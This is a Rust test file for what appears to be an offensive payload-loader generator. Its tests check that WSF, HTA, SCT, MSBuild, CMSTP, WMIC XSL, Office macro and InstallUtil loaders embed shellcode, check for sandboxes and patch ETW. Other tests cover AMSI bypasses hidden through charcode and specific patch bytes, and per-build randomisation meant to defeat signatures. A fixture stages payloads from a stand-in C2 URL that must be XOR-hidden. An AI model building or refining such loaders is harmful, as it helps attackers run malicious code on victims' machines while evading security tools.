use template_engine::*;

fn base_config(t: LoaderType) -> LoaderConfig {
    LoaderConfig {
        loader_type: t,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "fc4883e4f0".into(),
        key_hex: "deadbeef".into(),
        iv_hex: "0011223344556677".into(),
        pe_config: None,
        appdomain_config: None,
        wsf_stub_config: None,
        dotnet_stub_hex: None,
        staged: None,
    }
}

fn staged_config(t: LoaderType) -> LoaderConfig {
    LoaderConfig {
        loader_type: t,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "00".into(),
        key_hex: "00".repeat(32),
        iv_hex:  "00".repeat(16),
        pe_config: None,
        appdomain_config: if t == LoaderType::AppDomain {
            Some(AppDomainConfig {
                clr_version:   "v4.0.30319".into(),
                net_version:   "4.0".into(),
                assembly_name: "x".into(),
                type_name:     "y".into(),
                namespace:     "z".into(),
            })
        } else { None },
        wsf_stub_config: if matches!(t, LoaderType::Wsf | LoaderType::Hta | LoaderType::Regsvr32Sct | LoaderType::WmicXsl) {
            Some(WsfStubConfig { namespace: "x".into(), type_name: "y".into() })
        } else { None },
        dotnet_stub_hex: None,
        staged: Some(StagedConfig {
            url:        "https://c2.tradecraft.example/api/v1/stage/aabbccddeeff0011".into(),
            jwt:        "HEADER.PAYLOAD.SIGNATURE".into(),
            user_agent: "Mozilla/5.0 Windows".into(),
        }),
    }
}

fn assert_no_plaintext_staged_secrets(src: &str, label: &str) {
    assert!(!src.contains("c2.tradecraft.example"),
        "{}: staged URL host must be XOR-encoded, not plaintext", label);
    assert!(!src.contains("HEADER.PAYLOAD.SIGNATURE"),
        "{}: staged JWT must be XOR-encoded, not plaintext", label);
}

// ── Script: WSF ──────────────────────────────────────────────────────────────

#[test]
fn wsf_embeds_shellcode() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    assert!(src.contains("fc4883e4f0"), "shellcode must be embedded");
}

// AMSI/ETW reflection bypass has been moved into the DotNetToJScript stub
// (patchless via wsf_stub.cs.tera). Script templates no longer carry the
// signatured reflection path.

#[test]
fn wsf_has_sandbox_check() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    assert!(src.contains("vmtoolsd") || src.contains("ScreenWidth") || src.contains("Win32_Process"),
        "WSF must contain sandbox detection logic");
}

#[test]
fn wsf_no_plaintext_amsi_strings() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    // After charcode obfuscation the plaintext class name must not appear verbatim
    assert!(!src.contains("System.Management.Automation.AmsiUtils"),
        "AmsiUtils must be obfuscated via charcode array");
    assert!(!src.contains("\"amsiInitFailed\""),
        "amsiInitFailed must not appear as a plain quoted string");
}

// ── Script: HTA ──────────────────────────────────────────────────────────────

#[test]
fn hta_renders() {
    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
    assert!(src.contains("HTA:APPLICATION"), "HTA element required");
}

#[test]
fn hta_has_sandbox_check() {
    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
    assert!(src.contains("vmtoolsd") || src.contains("Screen.Width") || src.contains("Win32_Process"),
        "HTA must contain sandbox detection");
}

// ── Script: SCT ──────────────────────────────────────────────────────────────

#[test]
fn sct_renders() {
    let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
    assert!(src.contains("<scriptlet>"), "scriptlet root element required");
    assert!(src.contains("progid="), "progid attribute required");
}

#[test]
fn sct_has_sandbox_check() {
    let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
    assert!(src.contains("vmtoolsd") || src.contains("Win32_Process") || src.contains("ExecQuery("),
        "SCT must have sandbox check");
}

// ── Script: MSBuild ──────────────────────────────────────────────────────────

#[test]
fn msbuild_renders() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    assert!(src.contains("UsingTask"), "UsingTask element required");
    assert!(src.contains("CodeTaskFactory"), "CodeTaskFactory required");
}

#[test]
fn msbuild_no_rwx() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    // Allocate as RW (0x04), protect to RX (0x20).
    // 0x40 is legitimately present in the ETW patch section (temporary RWX for patching ntdll).
    assert!(src.contains("0x04") || src.contains("0x3000"),
        "MSBuild must allocate RW (not RWX)");
    assert!(src.contains("0x20"), "MSBuild must VirtualProtect to PAGE_EXECUTE_READ");
}

#[test]
fn msbuild_no_createthread_p_invoke() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    // Should use Thread class, not raw P/Invoke CreateThread
    assert!(src.contains("new Thread(") || src.contains("System.Threading"),
        "MSBuild should use Thread class instead of CreateThread P/Invoke");
    assert!(!src.contains("DllImport(\"kernel32\")\n        static extern IntPtr CreateThread"),
        "MSBuild must not P/Invoke CreateThread directly");
}

#[test]
fn msbuild_etw_bypass() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("new int[]"),
        "MSBuild must have ETW bypass via charcode or reflection");
}

#[test]
fn msbuild_no_static_delegate_names() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    assert!(!src.contains("NtAllocFn"), "MSBuild must not use static NtAllocFn delegate type name");
    assert!(!src.contains("NtProtFn"),  "MSBuild must not use static NtProtFn delegate type name");
    assert!(!src.contains("NtAlloc "),  "MSBuild must not use static NtAlloc variable name");
    assert!(!src.contains("NtProt "),   "MSBuild must not use static NtProt variable name");
}

#[test]
fn msbuild_no_static_helper_names() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    // Helper functions B() and N() must be renamed every build.
    // They are called as e.g. `xZqRmPwY(new int[]{...})` — single-letter names must not appear.
    assert!(!src.contains(" B(new int[]"), "MSBuild must not use static single-char helper B");
    assert!(!src.contains(" N(new int[]"), "MSBuild must not use static single-char helper N");
}

#[test]
fn msbuild_two_builds_different_locals() {
    let s1 = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    let s2 = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    // Delegate type declarations must differ between builds
    let find_delegate = |s: &str| -> String {
        s.lines().find(|l| l.contains("private delegate int ")).unwrap_or("").to_string()
    };
    assert_ne!(find_delegate(&s1), find_delegate(&s2),
        "MSBuild delegate type names must be randomised per build");
}

// ── Script: CMSTP ─────────────────────────────────────────────────────────────

#[test]
fn cmstp_renders() {
    let src = generate_script_source(&base_config(LoaderType::Cmstp)).unwrap();
    assert!(src.contains("UnRegisterOCXSection"), "CMSTP INF section required");
}

// ── Script: WMIC XSL ─────────────────────────────────────────────────────────

#[test]
fn wmic_xsl_renders() {
    let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
    assert!(src.contains("ms:script"), "ms:script block required");
}

#[test]
fn wmic_has_sandbox_check() {
    let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
    assert!(src.contains("vmtoolsd") || src.contains("Win32_Process") || src.contains("ExecQuery("),
        "WMIC XSL must have sandbox check");
}

// ── VBA: Word macro ───────────────────────────────────────────────────────────

#[test]
fn vba_word_renders() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    assert!(src.contains("Document_Open"), "Document_Open trigger required");
    assert!(src.contains("CallWindowProcA") || src.contains("CallWindowProc"),
        "CallWindowProcA execution primitive required");
}

#[test]
fn vba_word_has_etw_patch() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    // ETW patch: direct string, legacy byte markers, or new XOR-encoded runtime-decode loop
    assert!(src.contains("EtwEventWrite") || src.contains("etwCodes") || src.contains("ntdllCodes")
        || (src.contains("&H31") && src.contains("&HC0"))
        || (src.contains("Xor ") && src.contains("VarPtr")),
        "Word VBA must patch ETW");
}

#[test]
fn vba_word_no_rwx() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    // Must allocate shellcode memory with &H04 (PAGE_READWRITE) then VirtualProtect to &H20 (PAGE_EXECUTE_READ)
    assert!(src.contains("&H04") || src.contains("H3000"),
        "VBA Word must allocate as RW");
    assert!(src.contains("&H20"), "VBA Word must VirtualProtect to PAGE_EXECUTE_READ");
    // &H40 is legitimately used in the AMSI/ETW patch section (temporary RWX for patching);
    // the exec path itself must use &H04 alloc + &H20 protect (verified by the two assertions above).
}

#[test]
fn vba_word_amsi_obfuscated() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    // "AmsiScanBuffer" should be in charcode form, not as a plain string in GetProcAddress call
    assert!(!src.contains("GetProcAddress(amsiBase, \"AmsiScanBuffer\")"),
        "AmsiScanBuffer must not appear as plaintext in GetProcAddress call");
    // Charcode array for 'A','m','s','i'... = 65,109,115,105
    assert!(src.contains("65") && src.contains("109") && src.contains("115"),
        "AmsiScanBuffer must be built from integer codes");
}

#[test]
fn vba_word_has_sandbox_check() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    assert!(src.contains("sandbox") || src.contains("malware") || src.contains("Environ"),
        "VBA Word must have sandbox/environment checks");
}

// ── VBA: Excel macro ──────────────────────────────────────────────────────────

#[test]
fn vba_excel_renders() {
    let src = generate_vba_source(&base_config(LoaderType::XlsxMacro)).unwrap();
    assert!(src.contains("Workbook_Open"), "Workbook_Open trigger required");
}

#[test]
fn vba_excel_has_etw_patch() {
    let src = generate_vba_source(&base_config(LoaderType::XlsxMacro)).unwrap();
    assert!(src.contains("EtwEventWrite") || src.contains("etwCodes") || src.contains("ntdllCodes")
        || (src.contains("&H31") && src.contains("&HC0"))
        || (src.contains("Xor ") && src.contains("VarPtr")),
        "Excel VBA must patch ETW");
}

#[test]
fn vba_excel_no_rwx() {
    let src = generate_vba_source(&base_config(LoaderType::XlsxMacro)).unwrap();
    // Shellcode exec path: alloc as RW (&H04), protect to RX (&H20)
    assert!(src.contains("&H04"), "Excel VBA must allocate shellcode memory as RW (&H04)");
    assert!(src.contains("&H20"), "Excel VBA must VirtualProtect to PAGE_EXECUTE_READ (&H20)");
    // &H40 appears in the AMSI/ETW patching section (temporary RWX for byte patching) — that is expected.
}

// ── VBA: OPSEC regressions ────────────────────────────────────────────────────

#[test]
fn vba_word_no_hardcoded_comments() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    assert!(!src.contains("' Record cursor"), "hardcoded cursor comment in VBA output");
    assert!(!src.contains("' Execution delay"), "hardcoded sandbox-timing comment in VBA output");
    assert!(!src.contains("' VM/hypervisor"), "hardcoded VM comment in VBA output");
}

#[test]
fn vba_two_builds_produce_different_registry_arrays() {
    let src1 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    let src2 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    // Registry XOR key differs per build → the encoded integer sequence differs.
    // Variable name is now randomised too, so search for (0)= pattern (no spaces = array init line).
    let find_first_reg_line = |s: &str| -> String {
        s.lines().find(|l| l.contains("(0)=") && !l.contains("&H")).unwrap_or("").to_string()
    };
    assert_ne!(find_first_reg_line(&src1), find_first_reg_line(&src2),
        "VBA registry arrays must differ between builds (per-build XOR key + randomised var name)");
}

#[test]
fn vba_two_builds_produce_different_local_var_names() {
    let src1 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    let src2 = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    // Static local var names must NOT appear verbatim in generated VBA output.
    // Trailing space prevents false positives from substrings in longer names.
    for name in &["vmCodes", "wshShell", "vbCodes", "wmiSvc3", "wmiProc ",
                  "sc_hex ", "key_hex ", "_fnGcp "] {
        assert!(!src1.contains(name),
            "VBA output must not contain static var name {:?}", name);
    }
    // Any XOR decode line differs because var names AND XOR key are both randomised per build
    let xor_line = |s: &str| -> String {
        s.lines().find(|l| l.contains(") Xor ")).unwrap_or("").to_string()
    };
    assert_ne!(xor_line(&src1), xor_line(&src2),
        "VBA XOR-decode line must differ between builds (var names + XOR key both randomised)");
}

#[test]
fn wsf_two_builds_produce_different_registry_arrays() {
    let src1 = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    let src2 = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    // XOR key differs per build → encoded integer sequence differs
    let find_vmr_line = |s: &str| -> String {
        s.lines().find(|l| l.contains("]^=")).unwrap_or("").to_string()
    };
    assert_ne!(find_vmr_line(&src1), find_vmr_line(&src2),
        "WSF registry arrays must differ between builds (per-build XOR key)");
}

#[test]
fn wsf_no_static_binding_flags_36() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    // After stripping fn_amsi/fn_etw reflection bypass, no literal BindingFlags 36
    // (or its bitwise equivalent (4|32)) should remain in the WSF script body.
    assert!(!src.contains("), 36)"), "literal BindingFlags 36 must not appear in WSF output");
}

#[test]
fn wsf_stub_source_renders() {
    use template_engine::{generate_wsf_stub_source, WsfStubConfig};
    let mut cfg = base_config(LoaderType::Wsf);
    cfg.wsf_stub_config = Some(WsfStubConfig {
        namespace: "xTestNs".into(),
        type_name: "yTestClass".into(),
    });
    let src = generate_wsf_stub_source(&cfg).unwrap();
    assert!(src.contains("xTestNs"), "stub must use provided namespace");
    assert!(src.contains("yTestClass"), "stub must use provided type_name");
    assert!(src.contains("public static void Run"), "stub must have Run method");
    assert!(!src.contains("ntdll.dll"), "ntdll.dll must be charcode-encoded in stub");
    assert!(!src.contains("NtAllocateVirtualMemory"), "NT function names must be charcode-encoded");
}

// ── C#: InstallUtil ──────────────────────────────────────────────────────────

#[test]
fn csharp_installutil_renders() {
    let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("RunInstaller"), "RunInstaller attribute required");
    assert!(src.contains("Uninstall"), "Uninstall override required");
}

#[test]
fn csharp_installutil_no_rwx() {
    let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("0x04"), "InstallUtil must allocate as RW");
    assert!(src.contains("0x20"), "InstallUtil must VirtualProtect to RX");
    // 0x40 is legitimately present in the ETW patch section (temporary RWX for patching ntdll).
}

#[test]
fn csharp_installutil_no_createthread_p_invoke() {
    let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("new Thread("), "InstallUtil must use Thread class");
    assert!(!src.contains("extern IntPtr CreateThread"),
        "InstallUtil must not use CreateThread P/Invoke");
}

#[test]
fn csharp_installutil_has_etw_bypass() {
    let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("EventProvider") || src.contains("m_enabled") || src.contains("new int[]"),
        "InstallUtil must have ETW bypass");
}

// ── Staged-mode tests ─────────────────────────────────────────────────────────

#[test]
fn wsf_staged_uses_xmlhttp() {
    let src = generate_script_source(&staged_config(LoaderType::Wsf)).unwrap();
    assert!(src.contains("responseBody"), "WSF staged must read responseBody from XMLHTTP");
    assert_no_plaintext_staged_secrets(&src, "WSF");
}

#[test]
fn sct_staged_uses_xmlhttp() {
    let src = generate_script_source(&staged_config(LoaderType::Regsvr32Sct)).unwrap();
    assert!(src.contains("responseBody"), "SCT staged must read responseBody from XMLHTTP");
    assert_no_plaintext_staged_secrets(&src, "SCT");
}

#[test]
fn wmic_staged_uses_xmlhttp() {
    let src = generate_script_source(&staged_config(LoaderType::WmicXsl)).unwrap();
    assert!(src.contains("responseBody"), "WMIC staged must read responseBody from XMLHTTP");
    assert_no_plaintext_staged_secrets(&src, "WMIC");
}

#[test]
fn hta_staged_uses_winhttp() {
    let src = generate_script_source(&staged_config(LoaderType::Hta)).unwrap();
    assert!(src.contains("responseBody"), "HTA staged must read responseBody from WinHttp");
    assert_no_plaintext_staged_secrets(&src, "HTA");
}

#[test]
fn msbuild_staged_uses_httpwebrequest() {
    let src = generate_script_source(&staged_config(LoaderType::MsBuild)).unwrap();
    assert!(src.contains("HttpWebRequest"),
        "MSBuild staged must use HttpWebRequest");
    assert_no_plaintext_staged_secrets(&src, "MSBuild");
}

#[test]
fn installutil_staged_uses_httpwebrequest() {
    let src = generate_csharp_source(&staged_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("HttpWebRequest"),
        "InstallUtil staged must use HttpWebRequest");
    assert_no_plaintext_staged_secrets(&src, "InstallUtil");
}

#[test]
fn appdomain_staged_uses_httpwebrequest() {
    let src = generate_csharp_source(&staged_config(LoaderType::AppDomain)).unwrap();
    assert!(src.contains("HttpWebRequest"),
        "AppDomain staged must use HttpWebRequest");
    assert_no_plaintext_staged_secrets(&src, "AppDomain");
}

#[test]
fn vba_word_staged_uses_winhttp() {
    let src = generate_vba_source(&staged_config(LoaderType::DocxMacro)).unwrap();
    assert!(src.contains("responseBody"), "VBA Word staged must read responseBody");
    assert_no_plaintext_staged_secrets(&src, "VBA Word");
}

#[test]
fn vba_excel_staged_uses_winhttp() {
    let src = generate_vba_source(&staged_config(LoaderType::XlsxMacro)).unwrap();
    assert!(src.contains("responseBody"), "VBA Excel staged must read responseBody");
    assert_no_plaintext_staged_secrets(&src, "VBA Excel");
}

// ── EDR hardening: patchless AMSI in stub, reflection bypass removed ─────────

#[test]
fn wsf_no_reflection_amsi_bypass() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    // The signatured System.Management.Automation.AmsiUtils charcode (115,121,115,...) MUST NOT appear
    assert!(!src.contains("System.Management.Automation.AmsiUtils"),
        "WSF must not contain plaintext AmsiUtils reflection target");
    // The charcode-encoded form would be the byte sequence — assert as well that no
    // sequence starting "83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116" appears
    // (that's "System.Management" in ASCII decimal)
    assert!(!src.contains("83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116"),
        "WSF must not contain charcode-encoded System.Management target");
}

#[test]
fn hta_no_reflection_amsi_bypass() {
    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
}

#[test]
fn sct_no_reflection_amsi_bypass() {
    let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
}

#[test]
fn wmic_no_reflection_amsi_bypass() {
    let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
    assert!(!src.contains("System.Management.Automation.AmsiUtils"));
}

#[test]
fn wsf_stub_has_patchless_amsi() {
    let mut cfg = base_config(LoaderType::Wsf);
    cfg.wsf_stub_config = Some(WsfStubConfig {
        namespace: "x".into(), type_name: "y".into(),
    });
    let stub = generate_wsf_stub_source(&cfg).unwrap();
    // Verify the stub contains the 0xB8 0x57 0x00 0x07 0x80 0xC3 patch bytes
    assert!(stub.contains("0xB8") && stub.contains("0x57") && stub.contains("0xC3"),
        "stub must contain patchless AMSI patch bytes");
    // Verify it references AmsiScanBuffer charcode
    // "AmsiScanBuffer" first byte 'A' = 65
    assert!(stub.contains("65,109,115,105,83,99,97,110,66,117,102,102,101,114"),
        "stub must reference AmsiScanBuffer via charcode");
}

